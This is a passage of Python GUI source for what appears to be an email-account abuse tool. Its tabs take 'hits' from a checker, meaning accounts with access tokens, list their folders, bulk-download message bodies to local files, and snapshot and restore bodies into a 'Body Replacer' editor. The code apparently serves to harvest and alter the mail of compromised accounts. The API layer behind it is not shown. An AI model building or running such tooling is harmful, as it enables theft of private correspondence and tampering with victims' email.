    def copy_body_to_clipboard(self):
        """Copy editor content to clipboard"""
        content = self.replacer_editor.get("0.0", "end")
        pyperclip.copy(content)
        self.replacer_log.insert("end", "[INFO] Body copied to clipboard\n")
        self.replacer_result_label.configure(text="Copied! 📋", text_color="#00ff00")
        play_success_chime()

    def paste_body_from_clipboard(self):
        """Paste content from clipboard to editor"""
        content = pyperclip.paste()
        self.replacer_editor.delete("0.0", "end")
        self.replacer_editor.insert("0.0", content)
        self.replacer_log.insert("end", "[INFO] Content pasted from clipboard\n")
        self._refresh_preview()

    # ==================== DOWNLOADER TAB ====================
    def build_downloader_tab(self):
        tab = self.downloader_tab

        # Account selection
        acct_frame = ctk.CTkFrame(tab)
        acct_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(acct_frame, text="Account:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.download_acct_var = ctk.StringVar(value="No account selected")
        self.download_acct_menu = ctk.CTkOptionMenu(acct_frame, variable=self.download_acct_var,
                                                      values=["No account selected"], width=350)
        self.download_acct_menu.pack(side="left", padx=5)
        ctk.CTkButton(acct_frame, text="Refresh", command=self.refresh_downloader_accounts).pack(side="left", padx=5)

        # Folder selection for download
        folder_frame = ctk.CTkFrame(tab)
        folder_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(folder_frame, text="Source Folder:", font=("Consolas",12)).pack(side="left", padx=5)
        self.download_folder_var = ctk.StringVar(value="Select folder...")
        self.download_folder_menu = ctk.CTkOptionMenu(folder_frame, variable=self.download_folder_var,
                                                       values=["Select folder..."], width=250,
                                                       command=self.on_download_folder_change)
        self.download_folder_menu.pack(side="left", padx=5)
        ctk.CTkButton(folder_frame, text="Load Folders", command=self.load_downloader_folders).pack(side="left", padx=5)

        # Output settings
        output_frame = ctk.CTkFrame(tab)
        output_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(output_frame, text="Output Directory:", font=("Consolas",12)).pack(side="left", padx=5)
        self.download_out_entry = ctk.CTkEntry(output_frame, width=400)
        self.download_out_entry.insert(0, os.getcwd())
        self.download_out_entry.pack(side="left", padx=5)
        ctk.CTkButton(output_frame, text="Browse", command=self.browse_download_output).pack(side="left", padx=5)

        # Email filter options
        filter_frame = ctk.CTkFrame(tab)
        filter_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(filter_frame, text="Filter:", font=("Consolas",12)).pack(side="left", padx=5)
        self.download_filter_entry = ctk.CTkEntry(filter_frame, width=200)
        self.download_filter_entry.pack(side="left", padx=5)
        ctk.CTkLabel(filter_frame, text="Max Emails:", font=("Consolas",12)).pack(side="left", padx=10)
        self.download_max_entry = ctk.CTkEntry(filter_frame, width=80)
        self.download_max_entry.insert(0, "100")
        self.download_max_entry.pack(side="left", padx=5)
        
        # Date filter
        ctk.CTkLabel(filter_frame, text="From Date:", font=("Consolas",12)).pack(side="left", padx=10)
        self.download_date_entry = ctk.CTkEntry(filter_frame, width=120)
        self.download_date_entry.insert(0, "2024-01-01")
        self.download_date_entry.pack(side="left", padx=5)

        # Download options
        options_frame = ctk.CTkFrame(tab)
        options_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(options_frame, text="Options:", font=("Consolas",12,"bold")).pack(side="left", padx=5)
        self.download_attachments_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(options_frame, text="Include Attachments", variable=self.download_attachments_var).pack(side="left", padx=10)
        self.download_body_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(options_frame, text="Include Full Body", variable=self.download_body_var).pack(side="left", padx=10)

        # Action buttons
        btn_frame = ctk.CTkFrame(tab)
        btn_frame.pack(fill="x", pady=10)
        
        self.download_start_btn = ctk.CTkButton(btn_frame, text="▶ START DOWNLOAD", command=self.start_download,
                                                  fg_color="#00cc00", hover_color="#009900", font=("Consolas",12,"bold"))
        self.download_start_btn.pack(side="left", padx=5)
        self.download_stop_btn = ctk.CTkButton(btn_frame, text="■ STOP", command=self.stop_download,
                                                state="disabled", fg_color="red")
        self.download_stop_btn.pack(side="left", padx=5)
        
        self.download_progress = ctk.CTkProgressBar(btn_frame, orientation="horizontal", width=400)
        self.download_progress.pack(side="left", padx=20)
        self.download_progress.set(0)
        
        self.download_status_var = ctk.StringVar(value="Ready")
        ctk.CTkLabel(btn_frame, textvariable=self.download_status_var, font=("Consolas",12),
                     text_color="#00ff88").pack(side="left", padx=10)

        # Download progress details
        details_frame = ctk.CTkFrame(tab)
        details_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(details_frame, text="DOWNLOAD STATS", font=("Consolas",11,"bold")).pack(anchor="w")
        self.download_stats_label = ctk.CTkLabel(details_frame, text="Downloaded: 0 | Failed: 0 | Total: 0",
                                                  font=("Courier",10), text_color="#ff8c00")
        self.download_stats_label.pack(anchor="w")

        # Preview table
        table_frame = ctk.CTkFrame(tab)
        table_frame.pack(fill="both", expand=True, pady=5)
        
        ctk.CTkLabel(table_frame, text="DOWNLOADED EMAILS", font=("Consolas",12,"bold")).pack(anchor="w")
        
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Download.Treeview", font=("Courier", 9), rowheight=24)
        
        columns = ("Subject","From","Date","Status","Path")
        self.download_tree = ttk.Treeview(table_frame, columns=columns, show="headings",
                                           height=10, style="Download.Treeview")
        self.download_tree.heading("Subject", text="Subject")
        self.download_tree.heading("From", text="From")
        self.download_tree.heading("Date", text="Date")
        self.download_tree.heading("Status", text="Status")
        self.download_tree.heading("Path", text="Saved Path")
        
        self.download_tree.column("Subject", width=250)
        self.download_tree.column("From", width=150)
        self.download_tree.column("Date", width=130)
        self.download_tree.column("Status", width=80)
        self.download_tree.column("Path", width=300)
        
        self.download_tree.pack(fill="both", expand=True)

        # Log
        dl_log_frame = ctk.CTkFrame(tab)
        dl_log_frame.pack(fill="x", pady=5)
        ctk.CTkLabel(dl_log_frame, text="DOWNLOADER LOG", font=("Consolas",10,"bold")).pack(anchor="w")
        self.downloader_log = ctk.CTkTextbox(dl_log_frame, height=60, font=("Courier",9))
        self.downloader_log.pack(fill="x")

    # ==================== DOWNLOADER METHODS ====================
    def refresh_downloader_accounts(self):
        """Populate downloader account dropdown"""
        if not self.selected_hits_for_tools:
            self.downloader_log.insert("end", "[WARN] No accounts available. Select in Checker tab first.\n")
            return
        
        acct_names = [f"{a['email']} ({a['user_id'][:8]}...)" for a in self.selected_hits_for_tools]
        self.download_acct_menu.configure(values=acct_names)
        self.download_acct_var.set(acct_names[0])
        self.downloader_log.insert("end", f"[INFO] Loaded {len(acct_names)} accounts\n")
        self.downloader_log.see("end")

    def get_selected_downloader_account(self):
        """Get the currently selected account dict for downloader"""
        sel = self.download_acct_var.get()
        if "No account" in sel or not self.selected_hits_for_tools:
            return None
        values = self.download_acct_menu.cget("values")
        if sel not in values:
            return None
        idx = values.index(sel)
        if 0 <= idx < len(self.selected_hits_for_tools):
            return self.selected_hits_for_tools[idx]
        return None

    def load_downloader_folders(self):
        """Load folders for downloader"""
        acct = self.get_selected_downloader_account()
        if not acct:
            self.downloader_log.insert("end", "[WARN] Select an account first\n")
            return
        
        def log_callback(msg):
            self.root.after(0, lambda m=msg: (
                self.downloader_log.insert("end", f"[FOLDER] {m}\n"),
                self.downloader_log.see("end")
            ))
        
        self.downloader_log.insert("end", f"[INFO] Loading folders for {acct['email']}...\n")
        self.downloader_status = "Loading folders..."
        
        def worker():
            try:
                folders = self.indexer.get_user_folders(acct['access_token'], acct['user_id'], debug_callback=log_callback)
                self.download_folders = folders
                self.root.after(0, lambda: self._populate_downloader_folders(folders))
            except Exception as e:
                self.root.after(0, lambda: self.downloader_log.insert("end", f"[ERROR] {str(e)}\n"))
        
        threading.Thread(target=worker, daemon=True).start()

    def _populate_downloader_folders(self, folders):
        if not folders:
            self.downloader_log.insert("end", "[WARN] No folders found\n")
            return
        
        folder_names = [f"{f['name']} ({f.get('total_count', 0)})" for f in folders]
        self.download_folder_menu.configure(values=folder_names)
        self.download_folder_var.set(folder_names[0])
        self.download_folder_id = folders[0]['id']
        self.downloader_log.insert("end", f"[INFO] Found {len(folders)} folders\n")
        self.downloader_log.see("end")

    def on_download_folder_change(self, selection):
        """Handle folder selection change"""
        values = self.download_folder_menu.cget("values")
        if selection in values:
            idx = values.index(selection)
            if 0 <= idx < len(self.download_folders):
                self.download_folder_id = self.download_folders[idx]['id']

    def browse_download_output(self):
        """Browse for download output directory"""
        path = filedialog.askdirectory()
        if path:
            self.download_out_entry.delete(0, "end")
            self.download_out_entry.insert(0, path)

    def start_download(self):
        """Start downloading emails"""
        acct = self.get_selected_downloader_account()
        if not acct:
            self.downloader_log.insert("end", "[WARN] Select an account first\n")
            return
        
        if not hasattr(self, 'download_folder_id') or not self.download_folder_id:
            self.downloader_log.insert("end", "[WARN] Select a folder first\n")
            return
        
        self.download_running = True
        self.download_start_btn.configure(state="disabled")
        self.download_stop_btn.configure(state="normal")
        self.download_stats = {"downloaded": 0, "failed": 0, "total": 0}
        
        output_dir = self.download_out_entry.get()
        os.makedirs(output_dir, exist_ok=True)
        
        try:
            max_emails = int(self.download_max_entry.get())
        except:
            max_emails = 100
        
        filter_text = self.download_filter_entry.get()
        include_body = self.download_body_var.get()
        include_attachments = self.download_attachments_var.get()
        
        def worker():
            try:
                messages, _ = self.indexer.get_messages(
                    acct['access_token'], acct['user_id'],
                    self.download_folder_id, filter_text, max_emails, 0
                )
                
                total = len(messages)
                self.root.after(0, lambda: self.download_stats_label.configure(
                    text=f"Downloaded: 0 | Failed: 0 | Total: {total}"))
                
                for i, msg in enumerate(messages):
                    if not self.download_running:
                        break
                    
                    # Get full body if needed
                    body_content = ""
                    if include_body:
                        body_result = self.indexer.get_message_body(
                            acct['access_token'], acct['user_id'], msg['id']
                        )
                        if body_result:
                            body_content = body_result.get('body_content', '')
                    
                    # Save to file
                    safe_subject = re.sub(r'[^\w\s-]', '', msg['subject'])[:50]
                    filename = f"{msg['id'][:20]}_{safe_subject}.txt"
                    filepath = os.path.join(output_dir, filename)
                    
                    try:
                        with open(filepath, 'w', encoding='utf-8') as f:
                            f.write(f"Subject: {msg['subject']}\n")
                            f.write(f"From: {msg['from_name']} <{msg['from_email']}>\n")
                            f.write(f"Date: {msg['received']}\n")
                            f.write(f"ID: {msg['id']}\n")
                            f.write(f"Has Attachments: {msg['has_attachments']}\n")
                            f.write(f"\n{'='*60}\n")
                            f.write(f"BODY:\n{'='*60}\n")
                            f.write(body_content)
                        
                        self.download_stats["downloaded"] += 1
                        status = "OK"
                    except Exception as e:
                        self.download_stats["failed"] += 1
                        status = f"ERR: {str(e)[:20]}"
                    
                    # Update tree
                    self.root.after(0, lambda m=msg, s=status, p=filepath: (
                        self.download_tree.insert("", "end", values=(
                            m['subject'][:50], m['from_email'][:30],
                            m['received'][:19] if m['received'] else '', s, p
                        )),
                        self.download_stats_label.configure(
                            text=f"Downloaded: {self.download_stats['downloaded']} | Failed: {self.download_stats['failed']} | Total: {total}"),
                        self.download_progress.set((i+1)/total)
                    ))
                
                self.downloader_log.insert("end", f"[INFO] Download complete! {self.download_stats['downloaded']} saved, {self.download_stats['failed']} failed\n")
                play_success_chime()
                
            except Exception as e:
                self.downloader_log.insert("end", f"[ERROR] {str(e)}\n")
            
            self.root.after(0, self.stop_download)
        
        threading.Thread(target=worker, daemon=True).start()

    def stop_download(self):
        """Stop the download process"""
        self.download_running = False
        self.download_start_btn.configure(state="normal")
        self.download_stop_btn.configure(state="disabled")
        self.downloader_log.insert("end", "[INFO] Download stopped\n")

    # ==================== SNAPSHOT MANAGER TAB ====================
    def build_snapshot_tab(self):
        tab = self.snapshot_tab

        # === HEADER: Stats Dashboard ===
        header_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        header_frame.pack(fill="x", pady=(5, 10))

        stats_row = ctk.CTkFrame(header_frame, fg_color="transparent")
        stats_row.pack(fill="x", pady=10)

        # Stats boxes
        self.snap_total_label = ctk.CTkLabel(stats_row, text="📦 Total: 0",
                                               font=("Consolas", 14, "bold"), text_color="#00d4ff")
        self.snap_total_label.pack(side="left", padx=20)

        self.snap_size_label = ctk.CTkLabel(stats_row, text="💿 Size: 0 MB",
                                              font=("Consolas", 14, "bold"), text_color="#00ff88")
        self.snap_size_label.pack(side="left", padx=20)

        self.snap_verified_label = ctk.CTkLabel(stats_row, text="✅ Verified: 0",
                                                 font=("Consolas", 14, "bold"), text_color="#66ff66")
        self.snap_verified_label.pack(side="left", padx=20)

        self.snap_messages_label = ctk.CTkLabel(stats_row, text="📧 Messages: 0",
                                                 font=("Consolas", 14, "bold"), text_color="#ffcc00")
        self.snap_messages_label.pack(side="left", padx=20)

        ctk.CTkButton(stats_row, text="🔄 Refresh Stats", width=120,
                      command=self.refresh_snapshot_stats,
                      fg_color="#2a2a3a", hover_color="#3a3a4a").pack(side="right", padx=10)

        # === ACTIONS BAR ===
        action_bar = ctk.CTkFrame(tab, fg_color="#1a1a25")
        action_bar.pack(fill="x", pady=5)

        ctk.CTkLabel(action_bar, text="🎛️ Actions:", font=("Consolas",11,"bold")).pack(side="left", padx=5)

        ctk.CTkButton(action_bar, text="🔍 Verify All Snapshots", width=150, height=30,
                      command=self.verify_all_snapshots,
                      fg_color="#0066cc", hover_color="#0055aa").pack(side="left", padx=5)

        ctk.CTkButton(action_bar, text="🧹 Cleanup Old (30d)", width=140, height=30,
                      command=self.cleanup_old_snapshots,
                      fg_color="#663300", hover_color="#774400").pack(side="left", padx=5)

        ctk.CTkButton(action_bar, text="📂 Open Snapshots Folder", width=150, height=30,
                      command=self.open_snapshots_folder,
                      fg_color="#2a2a3a", hover_color="#3a3a4a").pack(side="left", padx=5)

        ctk.CTkButton(action_bar, text="🗑️ Delete All", width=100, height=30,
                      command=self.delete_all_snapshots,
                      fg_color="#660000", hover_color="#770000").pack(side="left", padx=20)

        # === SNAPSHOT LIST ===
        list_frame = ctk.CTkFrame(tab, fg_color="#0d0d15")
        list_frame.pack(fill="both", expand=True, pady=5)

        list_header = ctk.CTkFrame(list_frame, fg_color="#1a1a25", height=35)
        list_header.pack(fill="x")

        ctk.CTkLabel(list_header, text="💾 SNAPSHOT INDEX", font=("Consolas",12,"bold"),
                     text_color="#ff8c00").pack(side="left", padx=10)

        ctk.CTkButton(list_header, text="🔄 Refresh List", width=100, height=25,
                      command=self.refresh_snapshot_list,
                      fg_color="#2a2a3a", hover_color="#3a3a4a").pack(side="right", padx=5)

        # Snapshot tree view
        table_frame = ctk.CTkFrame(list_frame, fg_color="#0d0d15")
        table_frame.pack(fill="both", expand=True, padx=5, pady=5)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Snapshot.Treeview", font=("Consolas", 9), rowheight=24)

        columns = ("ID","Message","Subject","Hash","Size","Timestamp","Status")
        self.snapshot_tree = ttk.Treeview(table_frame, columns=columns, show="headings",
                                            height=12, style="Snapshot.Treeview")

        self.snapshot_tree.heading("ID", text="ID")
        self.snapshot_tree.heading("Message", text="Message ID")
        self.snapshot_tree.heading("Subject", text="Subject")
        self.snapshot_tree.heading("Hash", text="SHA-256")
        self.snapshot_tree.heading("Size", text="Size")
        self.snapshot_tree.heading("Timestamp", text="Captured")
        self.snapshot_tree.heading("Status", text="Status")

        self.snapshot_tree.column("ID", width=80)
        self.snapshot_tree.column("Message", width=120)
        self.snapshot_tree.column("Subject", width=200)
        self.snapshot_tree.column("Hash", width=100)
        self.snapshot_tree.column("Size", width=80)
        self.snapshot_tree.column("Timestamp", width=150)
        self.snapshot_tree.column("Status", width=80)

        self.snapshot_tree.pack(fill="both", expand=True)
        self.snapshot_tree.bind("<Double-1>", self.on_snapshot_double_click)

        # === SNAPSHOT DETAILS / ACTIONS ===
        detail_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        detail_frame.pack(fill="x", pady=5)

        detail_header = ctk.CTkFrame(detail_frame, fg_color="#1a1a25", height=35)
        detail_header.pack(fill="x")

        ctk.CTkLabel(detail_header, text="📋 SELECTED SNAPSHOT DETAILS", font=("Consolas",11,"bold"),
                     text_color="#00d4ff").pack(side="left", padx=10)

        self.snapshot_detail_text = ctk.CTkLabel(detail_frame, text="(Select a snapshot to view details)",
                                                  font=("Consolas",10), text_color="#888888", justify="left")
        self.snapshot_detail_text.pack(anchor="w", padx=10, pady=5)

        action_btns = ctk.CTkFrame(detail_frame, fg_color="transparent")
        action_btns.pack(fill="x", pady=5)

        ctk.CTkButton(action_btns, text="✅ Verify", width=100, height=30,
                      command=self.verify_selected_snapshot,
                      fg_color="#006600", hover_color="#007700").pack(side="left", padx=5)

        ctk.CTkButton(action_btns, text="🔄 Restore", width=100, height=30,
                      command=self.restore_selected_snapshot,
                      fg_color="#0066cc", hover_color="#0055aa").pack(side="left", padx=5)

        ctk.CTkButton(action_btns, text="👁️ View Raw", width=100, height=30,
                      command=self.view_raw_snapshot,
                      fg_color="#333366", hover_color="#444477").pack(side="left", padx=5)

        ctk.CTkButton(action_btns, text="🗑️ Delete", width=100, height=30,
                      command=self.delete_selected_snapshot,
                      fg_color="#660000", hover_color="#770000").pack(side="left", padx=5)

        # === LOG ===
        log_frame = ctk.CTkFrame(tab, fg_color="#0a0a15")
        log_frame.pack(fill="x", pady=(5, 0))

        log_header = ctk.CTkFrame(log_frame, fg_color="#1a1a25", height=30)
        log_header.pack(fill="x")

        ctk.CTkLabel(log_header, text="📜 SNAPSHOT LOG", font=("Consolas",10,"bold"),
                     text_color="#aaaaaa").pack(side="left", padx=10)

        ctk.CTkButton(log_header, text="Clear", width=60, height=22,
                      command=lambda: self.snapshot_log.delete("0.0", "end"),
                      fg_color="#333333", hover_color="#444444").pack(side="right", padx=5)

        self.snapshot_log = ctk.CTkTextbox(log_frame, height=50, font=("Consolas", 9),
                                            fg_color="#0d0d15", text_color="#00ff88")
        self.snapshot_log.pack(fill="x", padx=5, pady=5)

        # Initial refresh
        self.refresh_snapshot_stats()
        self.refresh_snapshot_list()

    # ==================== SNAPSHOT METHODS ====================
    def refresh_snapshot_stats(self):
        """Refresh snapshot statistics display"""
        try:
            stats = self.snapshot_engine.get_stats()
            self.snap_total_label.configure(text=f"📦 Total: {stats['total_snapshots']}")
            self.snap_size_label.configure(text=f"💿 Size: {stats['total_size_mb']} MB")
            self.snap_verified_label.configure(text=f"✅ Verified: {stats['verified_count']}")
            self.snap_messages_label.configure(text=f"📧 Messages: {stats['unique_messages']}")
            self.snapshot_log.insert("end", f"[INFO] Stats refreshed: {stats['total_snapshots']} snapshots\n")
            self.snapshot_log.see("end")
        except Exception as e:
            self.snapshot_log.insert("end", f"[ERROR] Failed to refresh stats: {str(e)}\n")

    def refresh_snapshot_list(self):
        """Refresh the snapshot list tree"""
        try:
            # Clear existing items
            for item in self.snapshot_tree.get_children():
                self.snapshot_tree.delete(item)

            # Populate from index
            for snap in self.snapshot_engine.index['snapshots']:
                verify = self.snapshot_engine.verify_snapshot(snap['snapshot_id'])
                status = "✅ OK" if verify.get('verified') else "❌ FAIL"
                status_color = "#00ff00" if verify.get('verified') else "#ff0000"

                # Shorten hash for display
                short_hash = snap.get('hash', '')[:16] + "..."

                # Format timestamp
                ts = snap.get('timestamp', '')[:19].replace('T', ' ')

                self.snapshot_tree.insert("", "end", values=(
                    snap['snapshot_id'][:8],
                    snap.get('message_id', '')[:20],
                    snap.get('subject', '(no subject)')[:30],
                    short_hash,
                    self._format_size(snap.get('size', 0)),
                    ts,
                    status
                ))

            self.snapshot_log.insert("end", f"[INFO] Loaded {len(self.snapshot_engine.index['snapshots'])} snapshots\n")
            self.snapshot_log.see("end")
        except Exception as e:
            self.snapshot_log.insert("end", f"[ERROR] Failed to refresh list: {str(e)}\n")

    def _format_size(self, size):
        """Format byte size to human readable"""
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size/1024:.1f} KB"
        else:
            return f"{size/(1024*1024):.2f} MB"

    def on_snapshot_double_click(self, event):
        """Show snapshot details on double-click"""
        item = self.snapshot_tree.selection()
        if not item:
            return
        values = self.snapshot_tree.item(item[0])['values']
        snapshot_id = values[0]

        # Find full snapshot info
        for snap in self.snapshot_engine.index['snapshots']:
            if snap['snapshot_id'].startswith(snapshot_id):
                verify = self.snapshot_engine.verify_snapshot(snap['snapshot_id'])
                status = "VERIFIED ✓" if verify.get('verified') else "FAILED ✗"

                detail = f"""
╔══════════════════════════════════════════════════════════════╗
║  SNAPSHOT DETAILS                                          ║
╠══════════════════════════════════════════════════════════════╣
║  ID:        {snap['snapshot_id'][:40]}
║  Message:   {snap.get('message_id', '')[:40]}
║  Subject:   {snap.get('subject', '(no subject)')[:40]}
║  Hash:      {snap.get('hash', '')[:40]}
║  Size:      {self._format_size(snap.get('size', 0))}
║  Captured:  {snap.get('timestamp', '')}
║  Status:    {status}
║  Path:      {snap.get('path', '')[:40]}
╚══════════════════════════════════════════════════════════════╝"""
                self.snapshot_detail_text.configure(text=detail, text_color="#00ff88")
                self.current_snapshot_id = snap['snapshot_id']
                break

    def verify_selected_snapshot(self):
        """Verify the currently selected snapshot"""
        if not hasattr(self, 'current_snapshot_id') or not self.current_snapshot_id:
            self.snapshot_log.insert("end", "[WARN] No snapshot selected\n")
            return

        result = self.snapshot_engine.verify_snapshot(self.current_snapshot_id)
        if result.get('verified'):
            self.snapshot_log.insert("end", f"[✓] Snapshot {self.current_snapshot_id[:8]}... VERIFIED\n")
            play_success_chime()
        else:
            self.snapshot_log.insert("end", f"[✗] Snapshot {self.current_snapshot_id[:8]}... FAILED: {result.get('error', 'hash mismatch')}\n", "red")
            play_beep(300, 200)

        self.refresh_snapshot_list()

    def verify_all_snapshots(self):
        """Verify all snapshots in the index"""
        verified = 0
        failed = 0

        for snap in self.snapshot_engine.index['snapshots']:
            result = self.snapshot_engine.verify_snapshot(snap['snapshot_id'])
            if result.get('verified'):
                verified += 1
            else:
                failed += 1
                self.snapshot_log.insert("end", f"[✗] {snap['snapshot_id'][:8]}... {result.get('error', 'hash mismatch')}\n")

        self.snapshot_log.insert("end", f"[INFO] Verification complete: {verified} OK, {failed} FAILED\n")
        if failed == 0:
            play_success_chime()
        else:
            play_beep(500, 300)

        self.refresh_snapshot_stats()
        self.refresh_snapshot_list()

    def restore_selected_snapshot(self):
        """Restore the selected snapshot"""
        if not hasattr(self, 'current_snapshot_id') or not self.current_snapshot_id:
            self.snapshot_log.insert("end", "[WARN] No snapshot selected\n")
            return

        result = self.snapshot_engine.restore_snapshot(self.current_snapshot_id)
        if result['status'] == 'restored':
            self.snapshot_log.insert("end", f"[✓] Snapshot RESTORED: {result['metadata']['subject']}\n")
            self.snapshot_log.insert("end", f"    Message ID: {result['metadata']['message_id']}\n")
            self.snapshot_log.insert("end", f"    Original timestamp: {result['metadata']['timestamp']}\n")

            # Load restored data into replacer
            try:
                content = result['data'].decode('utf-8', errors='replace')
                self.replacer_editor.delete("0.0", "end")
                self.replacer_editor.insert("0.0", content)
                self.replacer_log.insert("end", "[INFO] Restored content loaded into Body Replacer\n")
                self.notebook.set("Body Replacer")
            except:
                pass

            play_success_chime()
        else:
            self.snapshot_log.insert("end", f"[✗] Restore failed: {result.get('error', 'unknown error')}\n", "red")
            play_beep(400, 200)

    def view_raw_snapshot(self):
        """View raw snapshot content"""
        if not hasattr(self, 'current_snapshot_id') or not self.current_snapshot_id:
            self.snapshot_log.insert("end", "[WARN] No snapshot selected\n")
            return

        result = self.snapshot_engine.restore_snapshot(self.current_snapshot_id)
        if result['status'] == 'restored':
            # Show in a popup window
            popup = ctk.CTkToplevel(self.root)
            popup.title(f"Raw Snapshot: {result['metadata']['subject'][:50]}")
            popup.geometry("800x600")

            textbox = ctk.CTkTextbox(popup, font=("Consolas", 9))
            textbox.pack(fill="both", expand=True, padx=10, pady=10)

            try:
                content = result['data'].decode('utf-8', errors='replace')
                textbox.insert("0.0", content)
            except:
                textbox.insert("0.0", "[Binary content - cannot display as text]")
        else:
            self.snapshot_log.insert("end", f"[✗] View failed: {result.get('error', 'unknown error')}\n", "red")

    def delete_selected_snapshot(self):
        """Delete the selected snapshot"""
        if not hasattr(self, 'current_snapshot_id') or not self.current_snapshot_id:
            self.snapshot_log.insert("end", "[WARN] No snapshot selected\n")
            return

        result = self.snapshot_engine.delete_snapshot(self.current_snapshot_id)
        if result['status'] == 'deleted':
            self.snapshot_log.insert("end", f"[✓] Snapshot deleted: {self.current_snapshot_id[:8]}...\n")
            self.current_snapshot_id = None
            self.snapshot_detail_text.configure(text="(Select a snapshot to view details)")
            self.refresh_snapshot_stats()
            self.refresh_snapshot_list()
            play_beep(600, 100)
        else:
            self.snapshot_log.insert("end", f"[✗] Delete failed: {result.get('error', 'not found')}\n", "red")

    def cleanup_old_snapshots(self):
        """Clean up snapshots older than 30 days"""
        result = self.snapshot_engine.cleanup_old_snapshots(days=30)
        self.snapshot_log.insert("end", f"[INFO] Cleanup complete: {result['removed_count']} snapshots removed\n")
        self.refresh_snapshot_stats()
        self.refresh_snapshot_list()
        play_success_chime()

    def delete_all_snapshots(self):
        """Delete all snapshots (with confirmation)"""
        count = len(self.snapshot_engine.index['snapshots'])
        if count == 0:
            self.snapshot_log.insert("end", "[INFO] No snapshots to delete\n")
            return

        # Delete all snapshot files
        for snap in self.snapshot_engine.index['snapshots']:
            try:
                if os.path.exists(snap['path']):
                    os.remove(snap['path'])
            except:
                pass

        # Clear index
        self.snapshot_engine.index = {"snapshots": [], "by_message_id": {}, "by_email": {}}
        self.snapshot_engine._save_index()

        self.snapshot_log.insert("end", f"[✓] Deleted {count} snapshots\n")
        self.current_snapshot_id = None
        self.refresh_snapshot_stats()
        self.refresh_snapshot_list()
        play_beep(800, 100)

    def open_snapshots_folder(self):
        """Open the snapshots folder in file explorer"""
        path = self.snapshot_engine.base_path
        os.makedirs(path, exist_ok=True)
        try:
            if sys.platform == 'win32':
                os.startfile(path)
            elif sys.platform == 'darwin':
                subprocess.run(['open', path])
            else:
                subprocess.run(['xdg-open', path])
            self.snapshot_log.insert("end", f"[INFO] Opened: {path}\n")
        except Exception as e:
            self.snapshot_log.insert("end", f"[ERROR] Could not open folder: {str(e)}\n")

    # ==================== INDEXER METHODS ====================
    def refresh_indexer_accounts(self):
        """Populate indexer account dropdown from selected hits"""
        if not self.selected_hits_for_tools:
            self.indexer_log.insert("end", "[WARN] No accounts available. Select accounts in Checker tab first.\n")
            return

        acct_names = [f"{a['email']} ({a['user_id'][:8]}...)" for a in self.selected_hits_for_tools]
        self.indexer_acct_menu.configure(values=acct_names)
        self.indexer_acct_var.set(acct_names[0])
        self.indexer_log.insert("end", f"[INFO] Loaded {len(acct_names)} accounts\n")
        self.indexer_log.see("end")

    def get_selected_indexer_account(self):
        """Get the currently selected account dict for indexer"""
        sel = self.indexer_acct_var.get()
        if "No account" in sel or not self.selected_hits_for_tools:
            return None
        idx = self.indexer_acct_menu.cget("values").index(sel)
        if 0 <= idx < len(self.selected_hits_for_tools):
            return self.selected_hits_for_tools[idx]
        return None

    def fetch_indexer_folders(self):
        """Fetch folders for the selected account with detailed logging"""
        acct = self.get_selected_indexer_account()
        if not acct:
            self.indexer_log.insert("end", "[WARN] Select an account first\n")
            self.indexer_log.see("end")
            return

        self.current_account_for_indexer = acct
        self.indexer_status.configure(text="Fetching folders...")
        self.indexer_log.insert("end", f"[INFO] Fetching folders for {acct['email']}...\n")
        self.indexer_log.see("end")

        def log_callback(msg):
            """Callback to log messages to the indexer log"""
            self.root.after(0, lambda m=msg: (
                self.indexer_log.insert("end", f"[FOLDER] {m}\n"),
                self.indexer_log.see("end")
            ))

        def worker():
            try:
                folders = self.indexer.get_user_folders(acct['access_token'], acct['user_id'], debug_callback=log_callback)
                self.current_folders = folders
                self.root.after(0, lambda: self._populate_indexer_folders(folders))
            except Exception as e:
                self.root.after(0, lambda: self.indexer_log.insert("end", f"[ERROR] {str(e)}\n"))
                self.root.after(0, lambda: self.indexer_log.see("end"))

        threading.Thread(target=worker, daemon=True).start()

    def _populate_indexer_folders(self, folders):
        if not folders:
            self.indexer_log.insert("end", "[WARN] No folders found\n")
            return

        folder_names = [f"{f['name']} ({f.get('total_count', 0)})" for f in folders]
        self.indexer_folder_menu.configure(values=folder_names)
        self.indexer_folder_var.set(folder_names[0])
        self.current_folder_id = folders[0]['id']
        self.indexer_folder_info.configure(
            text=f"Total: {folders[0].get('total_count',0)} | Unread: {folders[0].get('unread_count',0)}"
        )
        self.indexer_log.insert("end", f"[INFO] Found {len(folders)} folders\n")
        self.indexer_log.see("end")
        self.indexer_status.configure(text="Folders loaded")
        # Auto-load first folder
        self.load_indexer_messages()

    def on_indexer_folder_change(self, selection):
        """Handle folder dropdown change"""
        idx = self.indexer_folder_menu.cget("values").index(selection)
        if 0 <= idx < len(self.current_folders):
            folder = self.current_folders[idx]
            self.current_folder_id = folder['id']
            self.indexer_folder_info.configure(
                text=f"Total: {folder.get('total_count',0)} | Unread: {folder.get('unread_count',0)}"
            )
            self.current_page = 0
            self.load_indexer_messages()

    def load_indexer_messages(self, search_query=""):
        """Load messages for current folder"""
        if not self.current_account_for_indexer or not self.current_folder_id:
            return

        self.indexer_status.configure(text="Loading messages...")
        acct = self.current_account_for_indexer
        skip = self.current_page * 50

        def worker():
            try:
                messages, next_link = self.indexer.get_messages(
                    acct['access_token'], acct['user_id'],
                    self.current_folder_id, search_query, 50, skip
                )
                self.current_messages = messages
                self.root.after(0, lambda: self._populate_indexer_messages(messages, next_link))
            except Exception as e:
                self.root.after(0, lambda: self.indexer_log.insert("end", f"[ERROR] {str(e)}\n"))

        threading.Thread(target=worker, daemon=True).start()

    def _populate_indexer_messages(self, messages, next_link):
        for row in self.indexer_tree.get_children():
            self.indexer_tree.delete(row)

        if not messages:
            self.indexer_log.insert("end", "[INFO] No messages found\n")
            self.indexer_log.see("end")

